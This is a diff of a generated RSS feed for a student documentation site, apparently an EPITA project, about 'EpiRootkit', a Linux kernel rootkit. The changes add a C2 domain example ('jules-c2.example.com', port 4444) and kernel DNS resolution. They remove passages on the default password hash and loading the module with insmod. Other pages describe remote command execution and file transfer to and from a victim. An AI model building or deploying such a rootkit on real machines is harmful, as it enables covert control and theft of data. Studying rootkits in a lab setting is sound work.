@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 29 May 2025 03:34:24 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 29 May 2025 19:11:41 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -71,14 +71,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="cdeabfTab" data-bs-toggle="tab" data-bs-target="#cdeabf"
-		 type="button" role="tab" aria-controls="cdeabf" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="adefbcTab" data-bs-toggle="tab" data-bs-target="#adefbc"
+		 type="button" role="tab" aria-controls="adefbc" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dafcbeTab" data-bs-toggle="tab" data-bs-target="#dafcbe"
-		 type="button" role="tab" aria-controls="dafcbe" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="fabedcTab" data-bs-toggle="tab" data-bs-target="#fabedc"
+		 type="button" role="tab" aria-controls="fabedc" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -95,7 +95,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="cdeabf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="adefbc" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
 &lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -705,7 +705,8 @@ pnpm start&lt;/code>
 &lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
 &lt;h2 id="what-we-built">What We Built &lt;a href="#what-we-built" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>EpiRootkit is a kernel module that provides:&lt;/p>
 &lt;ul>
-&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection to command &amp;amp; control server&lt;/li>
+&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection to command &amp;amp; control server with &lt;strong>domain support&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>DNS Resolution&lt;/strong>: Kernel-space DNS resolver for domain-based C2 servers&lt;/li>
 &lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
 &lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
@@ -803,15 +804,16 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  &lt;code>make clean &amp;amp;&amp;amp; make&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Expected output:&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication.&lt;/p>
+&lt;p>&lt;strong>Expected output:&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong>.&lt;/p>
 &lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-connection">Automatic Connection &lt;a href="#automatic-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
+&lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) using kernel DNS&lt;/li>
 &lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
 &lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
 &lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
 &lt;/ol>
-&lt;h3 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="configuration-with-domain-support--bonus-feature">Configuration with Domain Support (🆕 Bonus Feature) &lt;a href="#configuration-with-domain-support--bonus-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -826,95 +828,19 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="60de145" class="language-c ">
- &lt;code>// rootkit/core/config.h
-#define C2_SERVER_IP &amp;#34;192.168.64.1&amp;#34;
+ &lt;pre id="50c73ea" class="language-c ">
+ &lt;code>// rootkit/core/config.h - Domain examples
+#define C2_SERVER_ADDRESS &amp;#34;jules-c2.example.com&amp;#34; // Domain name
 #define C2_SERVER_PORT 4444
 #define KEEPALIVE_INTERVAL_MS 60000
-#define RECONNECT_DELAY_MS 5000&lt;/code>
+#define RECONNECT_DELAY_MS 5000
+
+// Or traditional IP
+#define C2_SERVER_ADDRESS &amp;#34;192.168.64.1&amp;#34; // IP address
+#define C2_SERVER_PORT 4444&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="network-architecture">Network Architecture &lt;a href="#network-architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-layer-system">Three-Layer System &lt;a href="#three-layer-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
-&lt;li>&lt;strong>Connection Management&lt;/strong> (&lt;code>connection.c&lt;/code>) - High-level coordination&lt;/li>
-&lt;li>&lt;strong>Keepalive System&lt;/strong> (&lt;code>keepalive.c&lt;/code>) - Health monitoring&lt;/li>
-&lt;li>&lt;strong>Socket Management&lt;/strong> (&lt;code>socket.c&lt;/code>) - Low-level network operations&lt;/li>
-&lt;/ol>
-&lt;h3 id="connection-states">Connection States &lt;a href="#connection-states" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;code>0&lt;/code> = DISCONNECTED&lt;/li>
-&lt;li>&lt;code>1&lt;/code> = CONNECTED&lt;/li>
-&lt;li>&lt;code>2&lt;/code> = CONNECTING&lt;/li>
-&lt;/ul>
-&lt;h2 id="authentication-system">Authentication System &lt;a href="#authentication-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
-&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>auth Client-1 password&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Plain text password&lt;/li>
-&lt;li>&lt;strong>Rootkit hashes&lt;/strong>: Using SHA-512 kernel crypto API&lt;/li>
-&lt;li>&lt;strong>Compares hash&lt;/strong>: Against stored hash in config&lt;/li>
-&lt;li>&lt;strong>Returns result&lt;/strong>: SUCCESS or ERROR&lt;/li>
-&lt;/ol>
-&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="063008f" class="language-c ">
- &lt;code>// Default password is &amp;#34;password&amp;#34; (SHA-512 hash stored in config)
-#define PASSWORD_HASH &amp;#34;b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86&amp;#34;&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="security-features">Security Features &lt;a href="#security-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Rate limiting&lt;/strong>: 5 attempts per 60 seconds&lt;/li>
-&lt;li>&lt;strong>Session timeout&lt;/strong>: 1 hour automatic expiry&lt;/li>
-&lt;li>&lt;strong>Secure hashing&lt;/strong>: SHA-512 using kernel crypto API&lt;/li>
-&lt;/ul>
-&lt;h2 id="live-demo">Live Demo &lt;a href="#live-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="44e0d15" class="language-bash ">
- &lt;code>cd attacking_program &amp;amp;&amp;amp; pnpm start&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="2-load-rootkit">2. Load Rootkit &lt;a href="#2-load-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="69c6f95" class="language-bash ">
- &lt;code>sudo insmod epirootkit.ko&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>&lt;strong>C2 server shows:&lt;/strong>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
+&lt;h3 id="runtime-parameters">Runtime Parameters &lt;a href="#runtime-parameters" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Override config.h settings during deployment:&lt;/p></description></item><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
 &lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
 &lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>exec Client-1 whoami&lt;/code>&lt;/li>
 &lt;li>&lt;strong>Rootkit receives&lt;/strong>: Command string via network&lt;/li>
@@ -1386,4 +1312,4 @@ givenfiles/&lt;/code>
  &lt;/div>
 &lt;p>Sauf que les fichiers n&amp;rsquo;étaient pas ignorés. &lt;em>(Vu que Léa ne sait pas écrire)&lt;/em> C&amp;rsquo;est là que nous découvrons un mystérieux fichier &lt;code>.README&lt;/code> :&lt;/p></description></item><item><title>Un dernier mot</title><link>/docs/07-remerciements/thankyou/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/07-remerciements/thankyou/</guid><description>&lt;h1 id="hugo">Hugo &lt;a href="#hugo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bonjour,&lt;/p>
 &lt;p>Merci beaucoup Jules pour ce projet!&lt;/p>
-&lt;p>Il m&amp;rsquo;a permis d’expérimenter plein de sujets différents, j&amp;rsquo;ai profité de l&amp;rsquo;excuse de &amp;ldquo;c&amp;rsquo;est pour le travail d&amp;rsquo;EPITA&amp;rdquo; pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j&amp;rsquo;ai pu mettre en pratique directement ce que j&amp;rsquo;ai pu apprendre dans mon travail, notamment j&amp;rsquo;avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j&amp;rsquo;ai pu m&amp;rsquo;en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n&amp;rsquo;ont qu’à bien se tenir). J&amp;rsquo;ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d&amp;rsquo;alternance on fait un projet aussi cool alors qu&amp;rsquo;ils se tapent de l’Active Directory depuis 2 mois.&lt;/p></description></item></channel></rss>
+&lt;p>Il m&amp;rsquo;a permis d’expérimenter plein de sujets différents, j&amp;rsquo;ai profité de l&amp;rsquo;excuse de &amp;ldquo;c&amp;rsquo;est pour le travail d&amp;rsquo;EPITA&amp;rdquo; pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j&amp;rsquo;ai pu mettre en pratique directement ce que j&amp;rsquo;ai pu apprendre dans mon travail, notamment j&amp;rsquo;avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j&amp;rsquo;ai pu m&amp;rsquo;en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n&amp;rsquo;ont qu’à bien se tenir). J&amp;rsquo;ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d&amp;rsquo;alternance on fait un projet aussi cool alors qu&amp;rsquo;ils se tapent de l’Active Directory depuis 2 mois.&lt;/p></description></item><item><title/><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description/></item></channel></rss>
